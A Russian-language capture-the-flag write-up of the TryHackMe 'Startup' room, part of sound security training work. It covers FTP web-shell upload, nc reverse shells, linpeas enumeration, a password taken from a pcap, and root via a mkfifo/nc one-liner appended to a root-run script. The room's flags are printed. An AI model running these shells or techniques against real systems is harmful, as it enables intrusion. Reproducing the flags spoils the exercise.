
# Writeup Task Tryhackme :Startup !
**by [andr1an0lv](https://github.com/redl1k)**     
**Дата сдачи и написание writeup:** 18.12.22                       
[**Ссылка видео-разбор таски**](https://youtu.be/yB92NvzZ6b4)                              
[**Ссылка на таску ТХМ**](https://tryhackme.com/room/startup)

---

## Подготовительные действия

**Перед началом решения нужно проделать следующие действия: **

1. Быть зарегестрированным на TryHackMe
2. Скачать VPN config 
(Нажмите на свою иконку->Вкладка Access)
![](https://i.imgur.com/urr1awd.png)
3. Далее зайти в Kali Linux 
4. Перекинуть VPN config в Kali Linux
5. Зайти в терминал и ввести следующую команду
```
┌──(root💀kali)-[/home/kali/Desktop]
└─# openvpn tryhackme-connect.ovpn 
```
*P.s tryhackme-connect <- название вашего конфига*

После всех этих проделанных действий, у нас есть подключение к тачке. 
И теперь мы можем хакать :) 


Решение
---
Нам выдали IP-address машины
В моем случае это 
```
IP Address
10.10.46.240 

*P.s У вас будет другой ip)*
```


#### 1. Первым делом, я пошел сканить nmap этот айпишник и вот что вышло:

```
┌──(root💀kali)-[/home/kali]
└─# nmap -T4 -sV -sC -O -A 10.10.46.240
┌────────────────────
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
22/tcp open  ssh     OpenSSH 7.2p2 | Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| 
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
└────────────────────
```
- Прекрасно, у нас открыты 3 порта:
-- FTP (FileTransportProtocol) 
-- SSH (SecureShell)
-- HTTP (Web)
#### 2. После этого скана, пробуем зайти на FTP под дэфолтными логами anonymous:anonymous.
```
┌──(root💀kali)-[/home/kali]
└─# ftp 10.10.46.240              
Connected to 10.10.46.240.
220 (vsFTPd 3.0.3)
Name (10.10.46.240:kali): anonymous
331 Please specify the password.
Password:
**230 Login successful.**
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
- Отлично мы смогли залогиниться под Anonymous

#### 3. Смотрим, что лежит на FTP серваке
```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp> 
``` 
- И видем, что на FTP сервере лежат два файлика, а именно:
-- *important.jpg
-- notice.txt*
#### 4. Скачаем эти два файлика
```
ftp> get important.jpg
ftp> get notice.txt
```
*P.s Файлы, которые мы скачали, скачаются в директорию, из которой мы подключались по ftp*.

#### 5. Смотрим, что это за файлики.
- important.jpg можно понять, что это какая-то фотка, открываем и смотрим.
![](https://i.imgur.com/kRdsfBI.png)
> *Все спрашивают, кто импостер
> Но никто не спрашивает кто импостер*

Пока что это фотка ничего не говорит, просто мемчик.

- Смотрим notice.txt - это просто текстовый документ, смотрим содержание
> Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
> Кто бы ни оставил эти чертовы мемы «Среди нас» в этой публикации, это НЕ СМЕШНО. Люди, загружающие документы с нашего сайта, подумают, что мы шутка! Теперь я не знаю, кто это, но Майя выглядит очень мило.

Кхм очень интересно, но ничего не понятно... Только нам дали имя собачки, которая на фотографии - Maya. Мб в дальнейшем это где-то поможет.. 

*Чтож идем дальше. На ВеБчИк*

#### 6. Заходим по айпиадресу тачки на веб
*Видем следующий текст:*
![](https://i.imgur.com/qBnsy1m.png)
![](https://i.imgur.com/NFJtMfH.png)

Если перейдем по ссыле *contact us* то там ничего не будет. Чтож опять ничего интересного. Ладненько..

#### 7. Давайте сканировать дериктории
Для легкого скана я буду использовать следующую команду:
```
┌──(root💀kali)-[/home/kali/Desktop/THM-Startup]
└─# dirsearch -e php,html,sql,js,tar,log,tar.gz,gz,zip,swp,rar,asp,aspx -u 10.10.46.240
``` 
- Это команда позволит нам посмотреть дериктории с такими расширениями. 

Сканим!)

```
[12:16:43] 200 - 1KB  - /files/
[12:16:48] 200 - 808B - /index.html
```
- У нас есть 2 ответа - /files/ и /index.html

index.html - это то что мы при заходи уведили, интересно что в /files/

- Перейдем и посмотрим, что там
![](https://i.imgur.com/lM2k1sN.png)

Ага видем здесь то, что лежит на FTP. Ясненько..

> *P.s
> В этот момент я не знал что делать и  стал брутить ssh пароли юзав hydra, для юзеров root, Maya. Когда прошло 10 минут, я понял, что нужно смотреть в другую сторону.*

* Поэтому возвращаемся к FTP
#### 8. Заходим опять на FTP сервер
И в данном шаге, у нас есть вариант, залить реверс шелл, которая даст нам доступ на тачку. Но для этого нужно кое-что подготовить.

### P.s. 
#### Здесь есть два решения, которые приведут к одному, поэтому можете попробовать оба. Или использовать один из них. 
---

#### * (1 способ)
9. Нам нужен будет файлик reverse php, который нам вернет консоль, которая будет прикреплена к тачке(по ходу действий поймете)

*Скачиваем следующий файл index.php с гитхаба*
  https://github.com/artyuum/simple-php-web-shell
#### 10. Сейчас будем грузить файл index.php на FTP сервер 

**Далее на FTP сервере переходим в директорию ftp**
```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Dec 17 20:29 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp> cd ftp
```
>   *p.s. мы переходим в ftp директорию для того чтобы загрузить наш файл index.php, а в той дериктории, которой мы первоначально появляемся, нельзя загрузить наш файл, т.к там нам не хватает прав на загрузку файлов.*

* Скачав файл index.html с github, загружаем его использовав следующую команду:  
**put index.php**
```
ftp> put index.php
local: index.php remote: index.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
2464 bytes sent in 0.00 secs (21.9612 MB/s)
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Dec 17 20:37 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
-rwxrwxr-x    1 112      118          2464 Dec 17 20:37 index.php
226 Directory send OK.
```

* Далее заходим на сайт 
``` http://10.10.46.240/files/ftp``` 

### * И видем следующие

![](https://i.imgur.com/DksVw5S.png)

### * Или же 
![](https://i.imgur.com/bHsZhHo.png)


* Далее мы можем в поле command попробуем ввести команду:  **ls -la **
![](https://i.imgur.com/0wxJBoa.png)

* Отлично мы видем, что у нас все работает и даже отрабатывают команды на сервере. Теперь пробуем применить в данном шаге реверс шеллку 

> * P.s Почитать об реверс шелле подробнее можно здесь: 
> https://telegra.ph/Reverse-Shell-CHto-ehto-i-zachem-nuzhno-07-22

#### 11. Заходим на сайт:
https://www.revshells.com/
![](https://i.imgur.com/kh1S31n.png)


> Этот сайт позволяет сгенерировать реверсшелл, которая нам даст доступ на тачку. В IP&Port вводим айпи хостовой тачки - (т.е нашей тачки), далее свободный порт(в моем случае я выбрал 8888)

* И вставляем наш сгенерированный питон

> *Почему питон, т.к прст решил его заюзать, тк бывает на +-многих серваках стоит питон, и поэтому я решил его заюзать и это сработало))) *

### Перед этим
**Нам нужно ввести в терминал следующую команду:**
```
┌──(root💀kali)-[/home/kali/Desktop/THM-Startup]
└─# nc -lvnp 8888
listening on [any] 8888 ...
```

**Далее, вводим в поле команду **
![](https://i.imgur.com/JFWwPxY.png)


**И видем следующие:**
```
┌──(root💀kali)-[/home/kali/Desktop/THM-Startup
└─# nc -lvnp 8888
listening on [any] 8888 ...
connect to [10.9.7.125] from (UNKNOWN) [10.10.46.240] 46122
$ 
```

* **Отлично мы получили коннект к серверу)**

## 2 способ получение коннекта к серверу
Нам нужно скопировать скрипт из следующего гитхаба:
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
Далее в Кали линукс зайти создать файлик 
revershe.php к примеру и туда вставить весь скрипт. 
* При этом нужно изменить следующие строки
![](https://i.imgur.com/Cz4RAZP.png)
IP - вводим свой хостовой машины
Port - любой к примеру 8888

Далее заходим на ftp сервер и закидываем его туда.
В терминале пишем nc -nvlp 8888
 
Дальше заходим по данному пути
http://10.10.46.240/files/ftp/reverse.php

И МЫ ПОЛУЧАЕМ КОННЕКТ )))
ООттллиичнноо Идем дальше 




*Теперь мы можем здесь побегать и порыскать файлики.*
Но для того, чтобы аддекватно пользоваться терминалом нужно ввести следующую команду:

`python3 -c 'import pty;pty.spawn("/bin/bash")'`

Такс мы получили терминал в таком ввиде
```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@startup:/var/www/html/files/ftp$ ls
ls
index.php
www-data@startup:/var/www/html/files/ftp$ 
```
Если мы перейдем в домашний католог, то увидем юзера lennie - но мы не можем за него зайти.. 

Перейдем в системный католог 
```
www-data@startup:/home$ cd /
cd /
www-data@startup:/$ ls
ls
bin   home	      lib	  mnt	      root  srv  vagrant
boot  incidents       lib64	  opt	      run   sys  var
dev   initrd.img      lost+found  proc	      sbin  tmp  vmlinuz
etc   initrd.img.old  media	  recipe.txt  snap  usr  vmlinuz.old
www-data@startup:/$ 
```
Здесь мы заметим файлик **recipe.txt**
Посмотрим его
```
www-data@startup:/$ cat recipe.txt
cat recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
```
- [ ] * **love - это ответ к 1 вопросу**
![](https://i.imgur.com/eswb7H4.png)

Если ввидем следующую команду, то более менне она станет еще лучше) 
`www-data@startup:/$ export TERM =xterm 
`

Чтож следующее что мы можем попробовать попав на тачку, это загрузить специальный скрипт, который покажет все что может найти на этой тачке интересного. А именно скрипт -> linpease

>  Скачать его можно от сюда  
> (linpease. sh)
> https://github.com/carlospolop/PEASS-ng/releases/tag/20221218

Далее через ftp нам нужно его закинуть в директорию ftp. Закидываем. И подключаемся на тачку использовав реверс шелл.

```
www-data@startup:/var/www/html/files/ftp$ ls
index.php  linpeas. sh
```
Теперь мы должны запустить этот скрипт 
просто введя в терминал следующую команду:
```
www-data@startup:/var/www/html/files/ftp$ ./linpeas.sh
./linpeas.sh
```
После всего сканирования дожидаемся окончания работы скана.
Когда закончил скрипт, мы можем посмотреть то, что нашел скрипт проанализировав всю машину. 

Что самое интересное можно заметить, а именно следующий файл:
![](https://i.imgur.com/OU0V0xl.png)

Есть какой-то файлик и директория, к которой не нужен рут юзер и можно спокойно туда зайти. Чтож, заходим!)
```
www-data@startup:/incidents$ ls
ls
suspicious.pcapng
www-data@startup:/incidents$ 

```
 * Видем файлик *suspicious.pcapng*
Это видимо какой-то файлик с трафиком (понял это по расширению **.pcapng**)
Давайте скопируем этот файлик в дерикторию ftp, чтобы мы смогли его скачать.

```
www-data@startup:/incidents$ cp suspicious.pcapng /var/www/html/files/ftp
www-data@startup:/incidents$ cd /var/www/html/files/ftp
www-data@startup:/var/www/html/files/ftp$ ls
index.php  linpeas.sh  suspicious.pcapng
www-data@startup:/var/www/html/files/ftp$ 

```


Заходим на веб и скачиваем этот файлик к себе на хост))
```
http://10.10.46.240/files/ftp/suspicious.pcapng
```

Открываем этот файлик в WireShark
![](https://i.imgur.com/lFlnZVm.png)

Далее правой кнопкой смотрим TCP пакеты
![](https://i.imgur.com/ZGkFObN.png)


И находим интересные пакетики:
![](https://i.imgur.com/CxGq8Mo.png)

Пробуем этот пароль использовать, чтобы залогиниться за lennie

```
www-data@startup:/var/www/html/files/ftp$ su -l lennie
Password: c4ntg3t3n0ughsp1c3
$ whoami
lennie
$ id
uid=1002(lennie) gid=1002(lennie) groups=1002(lennie)
$ /bin/bash
lennie@startup:~$
```
Хах) У нас получилось))
Отлично, идем дальше мы попали в домашнюю директорию попробуем посмотреть, что тут лежит.
```
lennie@startup:~$ ls
ls
Documents  scripts  user.txt
lennie@startup:~$ cat user.txt
cat user.txt
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```
А это файлик *user.txt*, в котором лежит флаг))

Идем дальше, помимо флага, у нас 2 дериктории и самая интересная это *scripts*. Заходим туда.
```
lennie@startup:~$ cd scripts
lennie@startup:~/scripts$ ls
planner.sh  startup_list.txt
lennie@startup:~/scripts$ cat planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
lennie@startup:~/scripts$ 
```
И мы здесь видем, скрипт который выполняет, что-то..Изменять его мы не можем, т.к прав не хватает. Но в конце еще есть непонятный скрипт print. sh, который лежит в каталоге /etc/

Давайте найдем его там
```
lennie@startup:~/scripts$ cd /etc/
lennie@startup:/etc$ ls -la | grep print.sh
-rwx------  1 lennie lennie    25 Nov 12  2020 print.sh
lennie@startup:/etc$ 
```
Мы можем заметить, что мы имеем права на чтение и запись этого файлика. Чтож давайте туда засунем реверс шеллку.

```
lennie@startup:/etc$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.48.143 8889 >/tmp/f' >> print.sh

┌──(root💀kali)-[/home/kali]
└─# nc -lvnp 8889
listening on [any] 8889 ...
connect to [10.8.48.143] from (UNKNOWN) [10.10.129.73] 38030
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# /bin/bash

ls
root.txt
cat root.txt
THM{f963aaa6a430f210222158ae15c3d76d}

```
Вот вообщем как-то так) Мы зашли за рута в итоге и смогли прочесть рутовский флаг. Сдаем и мы прошли всю машину) Ура))



## FAQ

:::info
**Есть вопросы? Задать их можно в комментарии к видеообзору на ютубе**

---
## 🌐 Socials | Соц Сети:
[![**YouTube Channel**](https://img.shields.io/badge/YouTube-%23FF0000.svg?logo=YouTube&logoColor=white)](https://youtube.com/@MrRedLik) 

[![**Instagram**](https://img.shields.io/badge/Instagram-%23E4405F.svg?logo=Instagram&logoColor=white)](https://instagram.com/andr1an0lv)

[**GitHub**](https://github.com/redl1k) 


###### tags: `WriteUp` `Pentest` `CTF` `tryhackme` 
